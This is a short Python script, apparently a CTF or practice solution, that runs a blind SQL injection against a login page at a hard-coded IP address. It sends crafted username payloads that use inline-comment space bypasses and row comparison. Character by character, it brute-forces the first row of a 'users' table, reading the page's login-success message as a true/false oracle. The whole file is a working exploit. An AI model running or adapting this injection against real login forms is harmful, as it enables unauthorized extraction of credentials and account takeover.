import requests
import string
s= requests.session()
url = "http://124.222.165.211:1239/login.php"
print(string.printable)
# for i in 
s1="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
fina_wod=""
for j in range(0,100):
    for i in range(0,62):
        payload =f"admin'||/**/('0','{fina_wod+s1[i]}','0')<(select/**/*/**/from/**/users/**/limit/**/0,1)#"
        data = {
            "username":payload,
            "password":"test"
        }
        
        r = s.post(url,data).text
        print(payload)
        if "登录成功" not in r:
            fina_wod+=s1[i-1]
            print(fina_wod)
            break